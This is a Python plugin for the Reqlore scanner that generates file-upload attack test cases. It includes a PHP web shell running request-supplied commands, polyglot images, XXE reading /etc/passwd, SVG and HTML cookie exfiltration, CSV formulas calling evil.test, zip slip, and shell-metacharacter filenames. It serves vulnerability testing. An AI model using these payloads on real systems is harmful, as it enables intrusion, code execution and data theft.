"""Reqlore File Upload Scanner — comprehensive upload-attack surface tests.

Inspired by Burp's ``UploadScanner`` extension (PortSwigger NetSPI/floyd)
but rewritten from scratch on top of the Reqlore plugin SDK. Covers
every Burp UploadScanner family plus several extras:

* Baseline + accepted-state diffing (status, body, redirect Location)
* Re-download verification of stored content (the most reliable
  oracle: did the file actually land?)
* OAST-based out-of-band detection for SVG/PDF/XML callbacks
* RCE marker tokens echoed back through PHP/ASP/JSP executors
* Extension blacklist bypass families: PHP, ASP, JSP, Perl, HTML,
  htaccess, web.config, .user.ini
* Case / trailing-dot / trailing-space / null-byte / double-extension
  / Apache-semicolon / IIS-shortname / Windows-ADS quirks
* Path traversal in filenames (encoded, double-encoded, UNC, drive
  letter, unicode-overlong, absolute-form)
* Polyglot files: GIF-PHP, JPG-PHP, PNG-PHP, ZIP-HTML, GIFAR
* Image-conversion attacks: ImageMagick MVG / MSL, Ghostscript escape
* XML attacks: SVG XXE (file + OAST), DOCX/XLSX XXE wrappers
* PDF attacks: ``/OpenAction`` SSRF, ``/JavaScript`` injection
* Compressed-content attacks: zip slip (``../`` entries), symlink
  archives, large-ratio zip bomb (small + flagged dangerous)
* Stored-XSS payloads in SVG, HTML, MJ JSON, file content + filename
* HTTP request smuggling / response splitting via filename CRLF
* CSV / formula injection (Excel auto-execute formulas)
* EICAR antivirus pass-through probe
* Shell-metacharacter filenames (``$(id)``, backtick-id, ``;ls``, ``|nc``)
* Mass denial-of-service variants (oversize, deep recursion) — gated
  by a settings toggle so unprivileged testers can't fire them
  accidentally.

Detection model is conservative and oracle-driven:

* "accepted-and-stored": the upload returned a baseline-looking
  response *and* a subsequent re-download fetched the same bytes back
  (or, for executor payloads, returned the rendered marker instead of
  the source). This is the only signal we report as ``high`` /
  ``critical`` because it's the only one with a server-side oracle.
* "accepted-not-verified": the upload returned a baseline-looking
  response but the operator hasn't configured a download URL template
  or the re-download didn't return the file. Reported as ``low``.
* "server-error": the upload returned 5xx. Reported as ``medium``
  because parser crashes are a real bug class.
* "oast-callback": OAST observed a request tied to the per-case
  unique token in the payload. Reported as ``high``.

Every test case respects ``ctx.stop_requested`` and the configured
inter-request delay so the plugin can be cancelled at any time and
won't hammer a fragile target.
"""
from __future__ import annotations

import base64
import io
import re
import secrets
import struct
import time
import zipfile
import zlib
from dataclasses import dataclass, field
from typing import Iterable, Sequence
from urllib.parse import urljoin, urlparse

from reqlore import plugins_sdk as sdk


# =============================================================================
# Plugin metadata
# =============================================================================

PLUGIN_INFO = sdk.make_info(
    name="file-upload-scanner",
    version="1.0",
    description=(
        "Comprehensive file-upload attack surface scanner — covers every "
        "Burp UploadScanner family plus polyglot, ImageMagick, zip slip, "
        "PDF/SVG SSRF, CSV injection, EICAR, response splitting, RCE-"
        "marker oracles and OAST callbacks."
    ),
    author="Reqlore",
    homepage="https://github.com/ibadawy/reqlore",
)


# =============================================================================
# Constants
# =============================================================================

_RCE_MARKER_PREFIX = "REQLORE_UPLOAD_MARKER_"

_PHP_SHELL_TPL = (
    "<?php echo '{marker}'; "
    "echo php_uname(); "
    "if(isset($_REQUEST['c'])) system($_REQUEST['c']); ?>"
)
_ASP_SHELL_TPL = (
    "<%@ Language=VBScript %><% Response.Write(\"{marker}\") %>"
)
_ASPX_SHELL_TPL = (
    "<%@ Page Language=\"C#\" %><% Response.Write(\"{marker}\"); %>"
)
_JSP_SHELL_TPL = (
    "<%@ page import=\"java.util.*\" %><%= \"{marker}\" %>"
)
_CFM_SHELL_TPL = "<cfoutput>{marker}</cfoutput>"
_PERL_SHELL_TPL = "#!/usr/bin/perl\nprint \"Content-Type: text/plain\\n\\n{marker}\\n\";"
_PYTHON_SHELL_TPL = "#!/usr/bin/python3\nprint('Content-Type: text/plain\\n')\nprint('{marker}')"

_HTACCESS_PAYLOAD = (
    "AddType application/x-httpd-php .reqlore\n"
    "AddHandler application/x-httpd-php .reqlore\n"
)
_WEB_CONFIG_PAYLOAD = (
    "<?xml version=\"1.0\"?>\n<configuration><system.webServer>"
    "<handlers accessPolicy=\"Read, Script, Write\">"
    "<add name=\"web_config\" path=\"*.reqlore\" verb=\"*\""
    " modules=\"IsapiModule\" scriptProcessor=\"%windir%\\system32\\inetsrv\\asp.dll\""
    " resourceType=\"Unspecified\"/></handlers></system.webServer></configuration>"
)
_USER_INI_PAYLOAD = "auto_prepend_file=reqlore.php\n"

_EICAR = (
    "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
).encode()

# Microsoft Office Open XML expects a zip with [Content_Types].xml; we
# emit a tiny one whose word/document.xml contains an XXE entity.
_DOCX_CONTENT_TYPES = (
    "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n"
    "<Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\">"
    "<Default Extension=\"xml\" ContentType=\"application/xml\"/>"
    "<Override PartName=\"/word/document.xml\""
    " ContentType=\"application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml\"/>"
    "</Types>"
)


# =============================================================================
# Tiny binary builders
# =============================================================================

def _png_blob(width: int = 1, height: int = 1) -> bytes:
    """Build the smallest possible valid PNG — 1×1 transparent pixel."""
    sig = b"\x89PNG\r\n\x1a\n"

    def chunk(tag: bytes, data: bytes) -> bytes:
        return (struct.pack(">I", len(data)) + tag + data
                + struct.pack(">I", zlib.crc32(tag + data) & 0xFFFFFFFF))

    ihdr = struct.pack(">IIBBBBB", width, height, 8, 6, 0, 0, 0)
    raw = b"".join(b"\x00" + b"\x00\x00\x00\x00" * width for _ in range(height))
    idat = zlib.compress(raw, 9)
    return sig + chunk(b"IHDR", ihdr) + chunk(b"IDAT", idat) + chunk(b"IEND", b"")


def _jpeg_blob() -> bytes:
    """Smallest valid JFIF JPEG: header + APP0 + SOF0 + DQT + DHT + SOS + EOI.

    Most servers only sniff the SOI + APP0 (``\\xFF\\xD8\\xFF\\xE0...JFIF``)
    so we return that plus a one-byte SOS and EOI marker — good enough
    to fool sniffers, not a renderable image.
    """
    return (
        b"\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01"
        b"\x00\x01\x00\x00"
        b"\xFF\xDB\x00C\x00" + bytes(64) +              # quant table
        b"\xFF\xC0\x00\x0B\x08\x00\x01\x00\x01\x01\x01\x11\x00"
        b"\xFF\xC4\x00\x14\x00" + bytes(17) +            # huffman table
        b"\xFF\xDA\x00\x08\x01\x01\x00\x00\x3F\x00"
        b"\x00"
        b"\xFF\xD9"
    )


def _gif_blob() -> bytes:
    """Minimal GIF89a — 1×1 black pixel."""
    return (
        b"GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff"
        b"!\xf9\x04\x00\x00\x00\x00\x00,\x00\x00\x00\x00"
        b"\x01\x00\x01\x00\x00\x02\x02D\x01\x00;"
    )


def _gif_php_polyglot(php: str) -> bytes:
    """Valid-looking GIF89a header followed by PHP source. PHP parses
    everything between ``<?php`` and ``?>``, ignoring the GIF prelude;
    image sniffers see ``GIF89a`` and accept the upload."""
    return b"GIF89a\x01\x00\x01\x00\x00\x00\x00;\n" + php.encode("utf-8", "replace")


def _png_php_polyglot(php: str) -> bytes:
    """PNG signature + IHDR + a tEXt chunk carrying the PHP source. The
    PNG is fully valid; PHP keeps the binary header as literal text up
    to ``<?php``."""
    return _png_blob() + b"\n" + php.encode("utf-8", "replace")


def _jpg_php_polyglot(php: str) -> bytes:
    return _jpeg_blob() + php.encode("utf-8", "replace")


def _svg_blob(inner: str) -> bytes:
    return (
        "<?xml version=\"1.0\" standalone=\"no\"?>\n"
        "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"1\" height=\"1\">"
        + inner +
        "</svg>"
    ).encode("utf-8", "replace")


def _svg_xss() -> bytes:
    return _svg_blob(
        "<script type=\"text/javascript\">"
        "fetch('/__reqlore_xss_marker?'+document.cookie)</script>"
    )


def _svg_xxe_oast(oast_url: str) -> bytes:
    """SVG with external general entity pointing at the OAST URL."""
    return (
        "<?xml version=\"1.0\" standalone=\"no\"?>\n"
        f"<!DOCTYPE svg [ <!ENTITY xxe SYSTEM \"{oast_url}\"> ]>\n"
        "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"1\" height=\"1\">"
        "<text x=\"0\" y=\"0\">&xxe;</text></svg>"
    ).encode("utf-8")


def _svg_xxe_file() -> bytes:
    """SVG XXE pointing at ``/etc/passwd`` — only works if the server
    parses XML server-side and echoes back the body or reflects errors.
    Operator must inspect the redownload response manually for
    ``root:x:0:0`` style content."""
    return (
        "<?xml version=\"1.0\" standalone=\"no\"?>\n"
        "<!DOCTYPE svg [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n"
        "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"1\" height=\"1\">"
        "<text x=\"0\" y=\"0\">&xxe;</text></svg>"
    ).encode("utf-8")


def _svg_ssrf(oast_url: str) -> bytes:
    """SVG that referenced an external image — many SVG renderers
    fetch the href server-side when rasterising thumbnails."""
    return _svg_blob(f'<image href="{oast_url}" width="1" height="1"/>')


def _docx_xxe(oast_url: str) -> bytes:
    """Build the smallest plausible .docx (ZIP container) whose
    word/document.xml carries an XXE pointing at the OAST URL. Office
    parsers used to fetch external DTDs; Office 2010 patched it but
    third-party renderers (LibreOffice, server-side converters) still
    do."""
    doc_xml = (
        "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n"
        f"<!DOCTYPE w:document [ <!ENTITY xxe SYSTEM \"{oast_url}\"> ]>\n"
        "<w:document xmlns:w=\"http://schemas.openxmlformats.org/wordprocessingml/2006/main\">"
        "<w:body><w:p><w:r><w:t>&xxe;</w:t></w:r></w:p></w:body></w:document>"
    )
    bio = io.BytesIO()
    with zipfile.ZipFile(bio, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", _DOCX_CONTENT_TYPES)
        zf.writestr("word/document.xml", doc_xml)
    return bio.getvalue()


def _xml_xxe(oast_url: str) -> bytes:
    return (
        "<?xml version=\"1.0\"?>\n"
        f"<!DOCTYPE r [ <!ENTITY xxe SYSTEM \"{oast_url}\"> ]>\n"
        "<r>&xxe;</r>"
    ).encode("utf-8")


def _pdf_oast(oast_url: str) -> bytes:
    """Minimal PDF whose ``/OpenAction`` points at a URI launch — many
    PDF readers / server-side renderers (e.g. PrinceXML, wkhtmltopdf,
    pdf2htmlEX, mupdf) honour it."""
    body = (
        b"%PDF-1.4\n"
        b"1 0 obj << /Type /Catalog /Pages 2 0 R "
        b"/OpenAction << /S /URI /URI ("
        + oast_url.encode() +
        b") >> >> endobj\n"
        b"2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj\n"
        b"3 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >> endobj\n"
        b"xref\n0 4\n"
        b"0000000000 65535 f\n"
        b"0000000010 00000 n\n"
        b"0000000110 00000 n\n"
        b"0000000170 00000 n\n"
        b"trailer << /Size 4 /Root 1 0 R >>\nstartxref\n230\n%%EOF\n"
    )
    return body


def _zip_slip() -> bytes:
    """ZIP whose entries climb out of the extraction dir via ``../``.
    Vulnerable extractors (older python, java, .net pre-fix) will
    write to parent directories."""
    bio = io.BytesIO()
    with zipfile.ZipFile(bio, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("../../../../tmp/reqlore_slip.txt", "owned by reqlore")
        zf.writestr("..\\..\\..\\..\\windows\\temp\\reqlore_slip.txt",
                    "owned by reqlore (windows form)")
    return bio.getvalue()


def _zip_php(php: str) -> bytes:
    """Plain ZIP containing a single ``shell.php`` entry — exposes
    decompress-then-serve pipelines."""
    bio = io.BytesIO()
    with zipfile.ZipFile(bio, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("shell.php", php)
    return bio.getvalue()


def _imagick_mvg(oast_url: str) -> bytes:
    """ImageMagick MVG escape — pre-7.0.1-1 ImageTragick exploited the
    URL coder; modern installs are patched but third-party services
    that proxy old ImageMagick are still common."""
    return (
        "push graphic-context\n"
        "viewbox 0 0 1 1\n"
        f"image Over 0,0 1,1 'url:{oast_url}'\n"
        "pop graphic-context\n"
    ).encode()


def _imagick_msl(oast_url: str) -> bytes:
    return (
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
        "<image>\n"
        f"  <read filename=\"{oast_url}\"/>\n"
        "  <write filename=\"out.png\"/>\n"
        "</image>\n"
    ).encode()


def _ghostscript_ssrf(oast_url: str) -> bytes:
    """GhostScript ``%!PS`` SAFER-bypass historic vector — converters
    that shell out to old gs binaries (ImageMagick, pdftoppm via gs)
    can be tricked into executing PostScript ops."""
    return (
        "%!PS-Adobe-3.0\n"
        f"({oast_url}) (r) file dup 1024 string readstring pop print\n"
        "showpage\n"
    ).encode()


def _csv_injection() -> bytes:
    """A handful of Excel formula-injection payloads, one per row."""
    payloads = [
        "=cmd|'/C calc'!A0",
        "=1+2\"=cmd|'/C calc'!A0\"",
        "=HYPERLINK(\"http://evil.test/?\"&A1,\"click\")",
        "@SUM(1+1)*cmd|'/C calc'!A0",
        "+1+cmd|'/C calc'!A0",
        "-2+cmd|'/C calc'!A0",
        "=2+5+cmd|'/C calc'!A0",
        "=IMPORTXML(\"http://evil.test/x\",\"//*\")",
    ]
    return ("user,formula\n" + "\n".join(
        f"user{i+1}," + p for i, p in enumerate(payloads)
    )).encode()


def _html_xss(marker_url: str) -> bytes:
    """Stored-XSS / open-redirect HTML payload. ``marker_url`` is an
    OAST callback so we know the page actually rendered."""
    return (
        "<!doctype html><html><head>"
        f"<script>fetch('{marker_url}?t='+document.cookie)</script>"
        f"<meta http-equiv=\"refresh\" content=\"0;url={marker_url}?meta=1\">"
        "</head><body>reqlore</body></html>"
    ).encode()


# =============================================================================
# Multipart builder
# =============================================================================

def _build_multipart(
    *,
    file_field: str,
    filename: str,
    file_content: bytes,
    file_content_type: str,
    extra_fields: Sequence[tuple[str, str]] = (),
    boundary: str | None = None,
) -> tuple[str, bytes]:
    """Build ``(content_type_header, body_bytes)`` for a multipart
    upload. The filename is inserted *as-is* into the
    ``Content-Disposition`` line; callers passing CRLF / null /
    semicolons are exercising server-side header-parser quirks
    deliberately.

    The boundary is a 24-char random hex so it never collides with the
    payload content.
    """
    if boundary is None:
        boundary = "reqlore" + secrets.token_hex(12)

    crlf = b"\r\n"
    out = io.BytesIO()
    for k, v in extra_fields:
        out.write(b"--" + boundary.encode() + crlf)
        out.write(
            f'Content-Disposition: form-data; name="{k}"'.encode() + crlf + crlf
        )
        out.write(str(v).encode("utf-8", "replace") + crlf)

    out.write(b"--" + boundary.encode() + crlf)
    cd = (f'Content-Disposition: form-data; name="{file_field}"; '
          f'filename="{filename}"').encode("utf-8", "replace")
    out.write(cd + crlf)
    out.write(f"Content-Type: {file_content_type}".encode() + crlf + crlf)
    out.write(file_content + crlf)
    out.write(b"--" + boundary.encode() + b"--" + crlf)

    return f"multipart/form-data; boundary={boundary}", out.getvalue()


def _put_body(content: bytes, content_type: str) -> tuple[str, bytes]:
    """For raw-PUT uploads the request body IS the file."""
    return content_type, content


# =============================================================================
# Test-case model
# =============================================================================

@dataclass
class UploadCase:
    name: str
    category: str
    filename: str
    content: bytes
    content_type: str
    severity_on_accept: str = "low"
    # OAST tag appended to the per-case URL path so we can match
    # callbacks back to the case that produced them.
    oast_tag: str = ""
    description: str = ""
    rce_marker: str = ""
    extra_form_fields: tuple[tuple[str, str], ...] = ()


# =============================================================================
# Case factories
# =============================================================================

def _exec_extensions(family: str) -> list[str]:
    """Server-side executable extensions per family. Mirrors and
    extends Burp UploadScanner's lists."""
    return {
        "php": [
            "php", "php3", "php4", "php5", "php7", "php8", "phtml",
            "phar", "pht", "shtml", "phtm",
        ],
        "asp": [
            "asp", "aspx", "ashx", "asmx", "asa", "cer", "cdx",
            "cshtml", "vbhtml",
        ],
        "jsp": ["jsp", "jspx", "jspf", "jsw", "jsv", "jhtml"],
        "perl": ["pl", "cgi", "pm"],
        "python": ["py", "pyc"],
        "ruby": ["rb"],
        "cf": ["cfm", "cfml", "cfc"],
    }.get(family, [])


def _bypass_filenames(base: str, ext: str) -> list[tuple[str, str]]:
    """Generate filename + a short label describing the bypass for a
    given (basename, target-extension)."""
    out: list[tuple[str, str]] = []
    f = f"{base}.{ext}"
    out.append((f, "plain"))
    out.append((f.upper(), "uppercase"))
    out.append((f"{base}.{ext.upper()}", "ext-upper"))
    out.append((f"{base}.{ext}.jpg", "double-ext-image-suffix"))
    out.append((f"{base}.jpg.{ext}", "double-ext-image-prefix"))
    out.append((f"{base}.{ext}.", "trailing-dot"))
    out.append((f"{base}.{ext} ", "trailing-space"))
    out.append((f"{base}.{ext}%20", "trailing-percent20"))
    out.append((f"{base}.{ext}%00.jpg", "null-byte-encoded"))
    out.append((f"{base}.{ext}\x00.jpg", "null-byte-literal"))
    out.append((f"{base}.{ext};.jpg", "apache-semicolon"))
    out.append((f"{base}.{ext}:.jpg", "windows-ads-colon"))
    out.append((f"{base}.{ext}::$DATA", "windows-ads-data"))
    out.append((f"{base}.{ext}/", "trailing-slash"))
    out.append((f"{base}.{ext}/.", "trailing-slash-dot"))
    out.append((f"{base}.{ext}\\.", "trailing-backslash-dot"))
    out.append((f"{base}.p\u0068{ext[1:] if len(ext) > 1 else ''}",
                "unicode-confusable"))
    out.append((f"{base}.{ext}#.jpg", "hash-truncation"))
    out.append((f"{base}.{ext}?.jpg", "query-truncation"))
    return out


def _traversal_filenames(base_filename: str) -> list[tuple[str, str]]:
    """Path-traversal filenames — both raw and encoded forms."""
    return [
        (f"../{base_filename}", "traversal-up-1"),
        (f"../../../../{base_filename}", "traversal-up-4"),
        (f"..\\..\\..\\..\\{base_filename}", "traversal-windows"),
        (f"%2e%2e%2f{base_filename}", "traversal-url-encoded"),
        (f"%252e%252e%252f{base_filename}", "traversal-double-encoded"),
        (f"..%c0%af{base_filename}", "traversal-utf8-overlong"),
        (f"..%2f..%2f{base_filename}", "traversal-mixed"),
        (f"/etc/passwd", "absolute-unix"),
        (f"/var/www/html/{base_filename}", "absolute-webroot"),
        (f"C:\\Windows\\Temp\\{base_filename}", "absolute-windows"),
        (f"\\\\attacker\\share\\{base_filename}", "unc-path"),
        (f"file:///{base_filename}", "file-uri"),
    ]


def _shell_metachar_filenames(ext: str) -> list[tuple[str, str]]:
    """Filenames whose basename contains shell metacharacters — flushes
    out servers that pipe ``filename`` into ``system()`` or build shell
    commands by string concatenation."""
    base = "reqlore"
    return [
        (f"{base};id.{ext}", "semicolon-id"),
        (f"{base}$(id).{ext}", "dollar-id"),
        (f"{base}`id`.{ext}", "backtick-id"),
        (f"{base}|id.{ext}", "pipe-id"),
        (f"{base}&id.{ext}", "amp-id"),
        (f"{base}\n.{ext}", "newline"),
        (f"{base}'\"`.{ext}", "quotes"),
        (f"{base}'; DROP TABLE files;--.{ext}", "sqli"),
        (f"{base}*)(uid=*.{ext}", "ldap-injection"),
        (f"{base}{{$ne:null}}.{ext}", "nosql-injection"),
        (f"{base}<script>alert(1)</script>.{ext}", "html-tag"),
        (f"{base}\r\nX-Injected: 1\r\n.{ext}", "crlf-header-splitting"),
        (f"{base}\r\n\r\nGET /admin HTTP/1.1\r\nHost: x\r\n.{ext}",
         "request-smuggling"),
        ("a" * 4096 + f".{ext}", "long-name"),
        (f".{base}.{ext}", "leading-dot"),
        (f"{base}.{ext}.bak", "ext-bak"),
        (f"{base}.{ext}~", "ext-tilde"),
    ]


def build_cases(
    settings: dict,
    *,
    oast_token: str | None = None,
    oast_base: str | None = None,
) -> list[UploadCase]:
    """Materialise the full suite based on toggles in ``settings``.

    ``oast_base`` is the per-token URL prefix; the per-case path is
    appended so callbacks can be matched back to a single case.
    """

    def oast_url(tag: str) -> str:
        if not (oast_token and oast_base):
            return "http://reqlore.invalid/"
        # Strip trailing slash on base then re-add our tag segment.
        b = oast_base.rstrip("/")
        return f"{b}/{tag}/"

    cases: list[UploadCase] = []
    marker = _RCE_MARKER_PREFIX + secrets.token_hex(8)

    # --------------------------------------------------- baseline
    cases.append(UploadCase(
        name="baseline-png",
        category="baseline",
        filename="reqlore_baseline.png",
        content=_png_blob(),
        content_type="image/png",
        severity_on_accept="info",
        description="Benign 1×1 PNG — establishes the accepted-state response signature.",
    ))

    # --------------------------------------------------- executor shells
    families = {
        "php": (settings.get("test_php", True),
                _PHP_SHELL_TPL.format(marker=marker),
                "application/x-php"),
        "asp": (settings.get("test_asp", True),
                _ASP_SHELL_TPL.format(marker=marker),
                "application/x-asp"),
        "aspx": (settings.get("test_asp", True),
                 _ASPX_SHELL_TPL.format(marker=marker),
                 "application/x-aspx"),
        "jsp": (settings.get("test_jsp", True),
                _JSP_SHELL_TPL.format(marker=marker),
                "application/x-jsp"),
        "perl": (settings.get("test_perl", True),
                 _PERL_SHELL_TPL.format(marker=marker),
                 "application/x-perl"),
        "python": (settings.get("test_python", False),
                   _PYTHON_SHELL_TPL.format(marker=marker),
                   "application/x-python"),
        "cf": (settings.get("test_cf", False),
               _CFM_SHELL_TPL.format(marker=marker),
               "application/x-cfm"),
    }
    family_to_exts = {
        "php": _exec_extensions("php"),
        "asp": _exec_extensions("asp"),
        "aspx": _exec_extensions("asp"),
        "jsp": _exec_extensions("jsp"),
        "perl": _exec_extensions("perl"),
        "python": _exec_extensions("python"),
        "cf": _exec_extensions("cf"),
    }
    base = "shell"
    for family, (enabled, body, ctype) in families.items():
        if not enabled:
            continue
        for ext in family_to_exts[family]:
            for fname, label in _bypass_filenames(base, ext):
                cases.append(UploadCase(
                    name=f"{family}-{ext}-{label}",
                    category=f"executor:{family}",
                    filename=fname,
                    content=body.encode("utf-8"),
                    content_type=ctype,
                    severity_on_accept="high",
                    rce_marker=marker,
                    description=(
                        f"{family.upper()} shell uploaded as .{ext} "
                        f"with the '{label}' bypass quirk. If the "
                        f"redownload returns the RCE marker, the "
                        f"server interpreted the file."
                    ),
                ))

    # --------------------------------------------------- server config
    if settings.get("test_htaccess", True):
        cases.append(UploadCase(
            name="htaccess-php-rebind", category="config",
            filename=".htaccess", content=_HTACCESS_PAYLOAD.encode(),
            content_type="text/plain", severity_on_accept="high",
            description=("Apache .htaccess that rebinds .reqlore as a PHP "
                         "handler. If accepted in a writable directory "
                         "served by Apache, any .reqlore upload becomes "
                         "RCE."),
        ))
        cases.append(UploadCase(
            name="web-config-iis", category="config",
            filename="web.config", content=_WEB_CONFIG_PAYLOAD.encode(),
            content_type="application/xml", severity_on_accept="high",
            description="IIS web.config remapping .reqlore to asp.dll.",
        ))
        cases.append(UploadCase(
            name="user-ini-php", category="config",
            filename=".user.ini", content=_USER_INI_PAYLOAD.encode(),
            content_type="text/plain", severity_on_accept="high",
            description="PHP .user.ini auto_prepend_file gadget.",
        ))

    # --------------------------------------------------- polyglots
    if settings.get("test_image_polyglot", True):
        php_body = _PHP_SHELL_TPL.format(marker=marker)
        for ext in ("jpg", "png", "gif"):
            content = {
                "jpg": _jpg_php_polyglot(php_body),
                "png": _png_php_polyglot(php_body),
                "gif": _gif_php_polyglot(php_body),
            }[ext]
            for suffix in (ext, f"{ext}.php", f"{ext}.phtml",
                           f"php.{ext}"):
                cases.append(UploadCase(
                    name=f"polyglot-{ext}-{suffix}",
                    category="polyglot",
                    filename=f"polyglot.{suffix}",
                    content=content,
                    content_type=f"image/{ext}",
                    severity_on_accept="high",
                    rce_marker=marker,
                    description=(
                        f"Valid {ext.upper()} header with embedded PHP. "
                        f"Saved as '.{suffix}' — image sniffers accept "
                        f"it, PHP-handler-by-extension executes it."
                    ),
                ))

    # --------------------------------------------------- SVG
    if settings.get("test_svg", True):
        cases.append(UploadCase(
            name="svg-xss", category="svg-xss",
            filename="xss.svg", content=_svg_xss(),
            content_type="image/svg+xml",
            severity_on_accept="medium",
            description=("SVG with inline <script>; if rendered "
                         "in-browser via /uploads/, fires stored XSS."),
        ))
        if settings.get("use_oast", True) and oast_token:
            tag = "svg-ssrf"
            cases.append(UploadCase(
                name="svg-ssrf", category="svg-ssrf",
                filename="ssrf.svg",
                content=_svg_ssrf(oast_url(tag)),
                content_type="image/svg+xml",
                severity_on_accept="high",
                oast_tag=tag,
                description=("SVG referencing an OAST URL via <image>. "
                             "Server-side rasterisers will fetch it."),
            ))
            tag = "svg-xxe"
            cases.append(UploadCase(
                name="svg-xxe-oast", category="svg-xxe",
                filename="xxe.svg",
                content=_svg_xxe_oast(oast_url(tag)),
                content_type="image/svg+xml",
                severity_on_accept="high",
                oast_tag=tag,
                description=("SVG with XXE external entity → OAST. "
                             "Triggers when the server parses XML."),
            ))
        cases.append(UploadCase(
            name="svg-xxe-file", category="svg-xxe",
            filename="xxefile.svg", content=_svg_xxe_file(),
            content_type="image/svg+xml",
            severity_on_accept="medium",
            description=("SVG XXE → file:///etc/passwd. Inspect the "
                         "rendered file body for leaked content."),
        ))

    # --------------------------------------------------- XML / Office
    if settings.get("test_xxe", True) and settings.get("use_oast", True) and oast_token:
        for ext, ct, payload in (
            ("xml", "application/xml", lambda u: _xml_xxe(u)),
            ("docx", "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
             lambda u: _docx_xxe(u)),
        ):
            tag = f"{ext}-xxe"
            cases.append(UploadCase(
                name=f"{ext}-xxe", category="xxe",
                filename=f"reqlore.{ext}",
                content=payload(oast_url(tag)),
                content_type=ct,
                severity_on_accept="high",
                oast_tag=tag,
                description=f"{ext.upper()} XXE → OAST callback.",
            ))

    # --------------------------------------------------- PDF
    if settings.get("test_pdf", True) and settings.get("use_oast", True) and oast_token:
        tag = "pdf-oast"
        cases.append(UploadCase(
            name="pdf-openaction-oast", category="pdf-ssrf",
            filename="reqlore.pdf",
            content=_pdf_oast(oast_url(tag)),
            content_type="application/pdf",
            severity_on_accept="medium",
            oast_tag=tag,
            description=("PDF with /OpenAction /URI pointing at OAST. "
                         "Server-side PDF renderers (Prince, "
                         "wkhtmltopdf, headless Chrome) follow it."),
        ))

    # --------------------------------------------------- ZIP / archive
    if settings.get("test_zip", True):
        cases.append(UploadCase(
            name="zip-slip", category="archive",
            filename="slip.zip", content=_zip_slip(),
            content_type="application/zip",
            severity_on_accept="high",
            description=("ZIP with ../ traversal entries. Vulnerable "
                         "extractors write files outside the upload "
                         "directory."),
        ))
        cases.append(UploadCase(
            name="zip-php", category="archive",
            filename="payload.zip",
            content=_zip_php(_PHP_SHELL_TPL.format(marker=marker)),
            content_type="application/zip",
            severity_on_accept="medium",
            rce_marker=marker,
            description=("ZIP containing shell.php. Servers that "
                         "auto-extract uploads expose the inner PHP."),
        ))

    # --------------------------------------------------- ImageMagick
    if settings.get("test_imagick", True) and settings.get("use_oast", True) and oast_token:
        for kind, ext, ct, builder in (
            ("mvg", "mvg", "image/mvg", _imagick_mvg),
            ("msl", "msl", "application/xml", _imagick_msl),
            ("gs",  "ps",  "application/postscript", _ghostscript_ssrf),
        ):
            tag = f"imagick-{kind}"
            cases.append(UploadCase(
                name=f"imagick-{kind}", category="imagick",
                filename=f"reqlore.{ext}",
                content=builder(oast_url(tag)),
                content_type=ct,
                severity_on_accept="critical",
                oast_tag=tag,
                description=f"ImageMagick {kind.upper()} → OAST.",
            ))

    # --------------------------------------------------- CSV / EICAR
    if settings.get("test_csv_injection", True):
        cases.append(UploadCase(
            name="csv-injection", category="csv-injection",
            filename="reqlore.csv", content=_csv_injection(),
            content_type="text/csv", severity_on_accept="low",
            description=("CSV containing Excel auto-execute formulas. "
                         "If the file is opened in Excel/Sheets by a "
                         "downstream user, the formula runs."),
        ))
    if settings.get("test_eicar", True):
        cases.append(UploadCase(
            name="eicar", category="antivirus",
            filename="reqlore_eicar.com", content=_EICAR,
            content_type="application/octet-stream",
            severity_on_accept="low",
            description=("EICAR antivirus test string. If accepted, no "
                         "AV scanning is in front of the upload "
                         "endpoint."),
        ))

    # --------------------------------------------------- HTML stored XSS
    if settings.get("test_svg", True) and settings.get("use_oast", True) and oast_token:
        tag = "html-xss"
        cases.append(UploadCase(
            name="html-stored-xss", category="html-xss",
            filename="reqlore.html",
            content=_html_xss(oast_url(tag)),
            content_type="text/html",
            severity_on_accept="medium",
            oast_tag=tag,
            description=("HTML page with fetch() to OAST. Reads the "
                         "victim's cookie if browsed under the app's "
                         "origin."),
        ))

    # --------------------------------------------------- path traversal
    if settings.get("test_path_traversal", True):
        png = _png_blob()
        for fname, label in _traversal_filenames("reqlore.png"):
            cases.append(UploadCase(
                name=f"traversal-{label}", category="path-traversal",
                filename=fname, content=png,
                content_type="image/png",
                severity_on_accept="medium",
                description=("PNG uploaded under a path-traversal "
                             f"filename ({label})."),
            ))

    # --------------------------------------------------- shell metachars
    if settings.get("test_shell_metachars", True):
        png = _png_blob()
        for fname, label in _shell_metachar_filenames("png"):
            cases.append(UploadCase(
                name=f"metachar-{label}", category="metachar",
                filename=fname, content=png,
                content_type="image/png",
                severity_on_accept="medium",
                description=("PNG uploaded under a filename containing "
                             f"shell / parser metacharacters ({label})."),
            ))

    # --------------------------------------------------- edge cases
    if settings.get("test_edge_cases", True):
        cases.append(UploadCase(
            name="empty-file", category="edge",
            filename="reqlore_empty.txt", content=b"",
            content_type="application/octet-stream",
            severity_on_accept="info",
            description="Zero-byte upload — exercises empty-body handling.",
        ))
        cases.append(UploadCase(
            name="no-extension", category="edge",
            filename="reqlore_noext", content=_png_blob(),
            content_type="image/png", severity_on_accept="info",
            description="PNG content with no filename extension.",
        ))
        cases.append(UploadCase(
            name="mime-mismatch", category="edge",
            filename="reqlore.png",
            content=b"<?php echo 'x'; ?>",
            content_type="image/png", severity_on_accept="medium",
            description=("PHP source served with image/png Content-Type "
                         "— exercises content-vs-extension validation."),
        ))
